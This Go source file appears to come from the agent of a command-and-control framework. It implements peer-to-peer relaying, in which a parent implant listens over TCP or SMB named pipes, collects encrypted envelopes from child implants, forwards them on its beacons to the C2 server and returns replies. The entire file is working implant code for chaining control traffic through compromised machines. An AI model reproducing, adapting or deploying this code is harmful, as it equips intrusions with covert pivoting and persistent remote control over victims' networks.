//go:build linux || windows || darwin
// +build linux windows darwin

package main

import (
	"encoding/binary"
	"encoding/json"
	"fmt"
	"io"
	"net"
	"strings"
	"sync"
	"time"

	"github.com/forgec2/forgec2/pkg/protocol"
)

// p2pCleanupStaleChildren prunes child UUIDs/results/tasks not seen in 10 minutes.
func p2pCleanupStaleChildren() {
	for {
		time.Sleep(5 * time.Minute)
		p2pRelayMu.Lock()
		cutoff := time.Now().Add(-10 * time.Minute)
		keep := make([]string, 0, len(p2pChildUUIDs))
		for _, uuid := range p2pChildUUIDs {
			if last, ok := p2pChildLastSeen[uuid]; ok && last.After(cutoff) {
				keep = append(keep, uuid)
			} else {
				delete(p2pChildResults, uuid)
				delete(p2pChildAcks, uuid)
				delete(p2pChildTasks, uuid)
				delete(p2pChildLastSeen, uuid)
				delete(p2pChildFrames, uuid)
			}
		}
		p2pChildUUIDs = keep
		p2pRelayMu.Unlock()
	}
}

// p2pEnvelopeUUID extracts the agent UUID from an opaque v2 envelope JSON.
// Only used server-side-independent routing on the parent; the envelope
// itself is never parsed for content on the relay path.
func p2pEnvelopeUUID(body []byte) string {
	var head struct {
		UUID string `json:"uuid"`
	}
	if err := json.Unmarshal(body, &head); err != nil {
		return ""
	}
	return head.UUID
}

// maxP2PChildren bounds the number of distinct child agents a parent will
// relay for at once, preventing a flood of (spoofable) child connections from
// exhausting parent memory.
const maxP2PChildren = 256

// p2pConnLimits bounds inbound P2P relay connections to resist slot-exhaustion
// and relay/reflector abuse from a single source (B3). The relay path currently
// has no mutual authentication — that requires a server-issued shared P2P key —
// so connection limiting is the available defense-in-depth control: a single
// peer (or spoofed source) cannot open an unbounded number of relay sockets to
// claim UUIDs or hold the parent's relay slots.
const (
	p2pMaxTotalConns = 256
	p2pMaxConnsPerIP = 32
)

var (
	p2pConnLimiterMu sync.Mutex
	p2pConnTotal     int
	p2pConnByIP      = map[string]int{}
)

// p2pConnKey derives a stable per-source key from a relay connection's remote
// address. Named-pipe/SMB peers may not expose a network address; we fall back
// to a constant so they share the global (but not per-IP) budget.
func p2pConnKey(conn net.Conn) string {
	if conn == nil {
		return "unknown"
	}
	addr := conn.RemoteAddr()
	if addr == nil {
		return "local"
	}
	h, _, err := net.SplitHostPort(addr.String())
	if err != nil || h == "" {
		return "local"
	}
	return h
}

// p2pAcceptConn registers an inbound relay connection; it returns false (and the
// caller must close) when the global or per-source connection budget is reached.
func p2pAcceptConn(conn net.Conn) bool {
	key := p2pConnKey(conn)
	p2pConnLimiterMu.Lock()
	defer p2pConnLimiterMu.Unlock()
	if p2pConnTotal >= p2pMaxTotalConns {
		return false
	}
	if p2pConnByIP[key] >= p2pMaxConnsPerIP {
		return false
	}
	p2pConnTotal++
	p2pConnByIP[key]++
	return true
}

// p2pEndConn releases a connection's budget slot.
func p2pEndConn(conn net.Conn) {
	key := p2pConnKey(conn)
	p2pConnLimiterMu.Lock()
	defer p2pConnLimiterMu.Unlock()
	if p2pConnTotal > 0 {
		p2pConnTotal--
	}
	if p2pConnByIP[key] > 0 {
		p2pConnByIP[key]--
		if p2pConnByIP[key] == 0 {
			delete(p2pConnByIP, key)
		}
	}
}

// p2p claim state: binds each child connection to the first child UUID it
// claims. The first connection to claim a UUID wins; a second connection
// claiming the same (or any) UUID is rejected. This stops a hostile/forged
// peer from opening many connections that all impersonate one victim's relay
// slot and poison its queue, and bounds total relayed children.
var (
	p2pClaimMu    sync.Mutex
	p2pConnChild  = map[any]string{} // connection → claimed child UUID
	p2pChildOwner = map[string]any{} // child UUID → owning connection
)

func p2pClaimChild(conn any, childID string) bool {
	p2pClaimMu.Lock()
	defer p2pClaimMu.Unlock()
	if claimed, ok := p2pConnChild[conn]; ok {
		// Already bound to this connection: only accept its claimed UUID.
		return claimed == childID
	}
	if owner, ok := p2pChildOwner[childID]; ok && owner != conn {
		return false // UUID already claimed by another connection
	}
	if len(p2pChildOwner) >= maxP2PChildren {
		return false
	}
	p2pConnChild[conn] = childID
	p2pChildOwner[childID] = conn
	return true
}

func p2pReleaseChild(conn any) {
	p2pClaimMu.Lock()
	defer p2pClaimMu.Unlock()
	if id, ok := p2pConnChild[conn]; ok {
		if p2pChildOwner[id] == conn {
			delete(p2pChildOwner, id)
		}
		delete(p2pConnChild, conn)
	}
}

// p2pQueueChildFrame records an opaque child envelope for forwarding to the
// C2 server on the next parent beacon. Returns false for malformed input.
func p2pQueueChildFrame(childID string, envelope []byte) bool {
	if childID == "" || len(envelope) == 0 {
		return false
	}
	p2pRelayMu.Lock()
	defer p2pRelayMu.Unlock()
	isNew := true
	for _, uuid := range p2pChildUUIDs {
		if uuid == childID {
			isNew = false
			break
		}
	}
	if isNew {
		p2pChildUUIDs = append(p2pChildUUIDs, childID)
	}
	p2pChildLastSeen[childID] = time.Now()
	// Bound the per-child relay queue so a hostile or chatty child cannot grow
	// memory without bound. The oldest envelope is dropped when full.
	frames := p2pChildFrames[childID]
	if len(frames) >= maxP2PChildFrames {
		frames = frames[1:]
	}
	if len(envelope) <= maxP2PChildFrameBytes {
		p2pChildFrames[childID] = append(frames, envelope)
	} else if Debug {
		fmt.Printf("[!] dropping oversized p2p child frame from %s (size=%d)\n", childID, len(envelope))
	}
	inFastMode.Store(true)
	select {
	case beaconWake <- struct{}{}:
	default:
	}
	return true
}

// p2pDrainChildFrames returns all queued child envelopes and clears the
// queue. Called once per parent beacon when building the request body.
func p2pDrainChildFrames() []protocol.RelayedFrame {
	p2pRelayMu.Lock()
	defer p2pRelayMu.Unlock()
	var out []protocol.RelayedFrame
	for _, childID := range p2pChildUUIDs {
		frames := p2pChildFrames[childID]
		if len(frames) == 0 {
			continue
		}
		for _, env := range frames {
			out = append(out, protocol.RelayedFrame{AgentID: childID, Envelope: env})
		}
		p2pChildFrames[childID] = nil
	}
	return out
}

// p2pDeliverChildReplies stores per-child response envelopes so pending
// child sockets waiting on p2pWaitChildReply can pick their reply up.
func p2pDeliverChildReplies(replies []protocol.RelayedReply) {
	if len(replies) == 0 {
		return
	}
	p2pRelayMu.Lock()
	defer p2pRelayMu.Unlock()
	for _, r := range replies {
		p2pChildReplies[r.AgentID] = append(p2pChildReplies[r.AgentID], r.Envelope)
	}
}

// p2pPendingChildReply reports whether at least one reply is queued for a child.
func p2pPendingChildReply(childID string) bool {
	p2pRelayMu.Lock()
	defer p2pRelayMu.Unlock()
	return len(p2pChildReplies[childID]) > 0
}

// p2pTakeChildReply pops the oldest queued reply for a child.
func p2pTakeChildReply(childID string) []byte {
	p2pRelayMu.Lock()
	defer p2pRelayMu.Unlock()
	q := p2pChildReplies[childID]
	if len(q) == 0 {
		return nil
	}
	reply := q[0]
	p2pChildReplies[childID] = q[1:]
	return reply
}

// p2pRelayTimeout is how long a child socket waits for the parent's beacon
// round-trip before giving up. Must exceed the parent's worst-case beacon
// interval plus margin (parent wakes on beaconWake + fast mode).
const p2pRelayTimeout = 90 * time.Second

// p2pHandleChild processes one child connection. The child sends an opaque
// v2 envelope; the parent queues it for the next beacon to the server and
// returns the server's encrypted reply envelope verbatim — the parent never
// sees the child's plaintext.
func p2pHandleChild(conn net.Conn) {
	defer conn.Close()
	// Enforce per-source/global connection budgets before spending any relay
	// state on this peer (B3).
	if !p2pAcceptConn(conn) {
		if Debug {
			fmt.Printf("[!] p2p: rejected inbound relay connection from %s (connection budget exhausted)\n", p2pConnKey(conn))
		}
		return
	}
	defer p2pEndConn(conn)
	// Cover the whole relay round-trip: read + queue + server beacon + reply.
	conn.SetDeadline(time.Now().Add(p2pRelayTimeout + 30*time.Second))

	// Read request length + body
	var rlen uint32
	if err := binary.Read(conn, binary.BigEndian, &rlen); err != nil {
		return
	}
	if rlen == 0 || rlen > 16*1024*1024 {
		return
	}
	body := make([]byte, rlen)
	if _, err := io.ReadFull(conn, body); err != nil {
		return
	}

	childID := p2pEnvelopeUUID(body)
	if childID == "" {
		return
	}

	// Bind this connection to the claimed child UUID; reject if another
	// connection already owns it or the relay is at capacity.
	if !p2pClaimChild(conn, childID) {
		if Debug {
			fmt.Printf("[!] p2p: rejected child connection claiming %s (owned by another conn or at capacity)\n", childID)
		}
		return
	}
	defer p2pReleaseChild(conn)

	// Queue the envelope for the next parent beacon.
	if !p2pQueueChildFrame(childID, body) {
		return
	}

	// Wait for the server's opaque reply envelope (delivered after the next
	// parent beacon response). The page deadline covers one beacon cycle;
	// if the parent is mid-beacon the reply is usually already queued.
	deadline := time.Now().Add(p2pRelayTimeout)
	for time.Now().Before(deadline) {
		if reply := p2pTakeChildReply(childID); reply != nil {
			conn.SetDeadline(time.Now().Add(10 * time.Second))
			binary.Write(conn, binary.BigEndian, uint32(len(reply)))
			conn.Write(reply)
			return
		}
		time.Sleep(100 * time.Millisecond)
	}
}

// sendP2PBeacon sends beacon request to parent agent via TCP or Named Pipe
func sendP2PBeacon(body []byte) []byte {
	if strings.HasPrefix(P2PParent, "pipe://") {
		return sendP2PSMBBeacon(body)
	}
	return sendP2PTCPBeacon(body)
}

func sendP2PTCPBeacon(body []byte) []byte {
	addr := strings.TrimPrefix(P2PParent, "tcp://")
	conn, err := net.Dial("tcp", addr)
	if err != nil {
		if Debug {
			fmt.Printf("[!] P2P TCP dial to %s failed: %v\n", addr, err)
		}
		return nil
	}
	defer conn.Close()

	if err := binary.Write(conn, binary.BigEndian, uint32(len(body))); err != nil {
		return nil
	}
	if _, err := conn.Write(body); err != nil {
		return nil
	}

	var rlen uint32
	if err := binary.Read(conn, binary.BigEndian, &rlen); err != nil {
		return nil
	}
	if rlen == 0 || rlen > 16*1024*1024 {
		return nil
	}
	rbuf := make([]byte, rlen)
	if _, err := io.ReadFull(conn, rbuf); err != nil {
		return nil
	}
	return rbuf
}

// p2pParentListen accepts child agent connections in a loop
func p2pParentListen() {
	if P2PMode == "smb" {
		p2pListenSMB()
	} else if P2PMode == "tcp" {
		p2pListenTCP()
	}
}

func p2pListenTCP() {
	ln, err := net.Listen("tcp", P2PListenAddr)
	if err != nil {
		if Debug {
			fmt.Printf("[!] P2P TCP listen on %s failed: %v\n", P2PListenAddr, err)
		}
		return
	}
	defer ln.Close()
	for {
		conn, err := ln.Accept()
		if err != nil {
			continue
		}
		go p2pHandleChild(conn)
	}
}
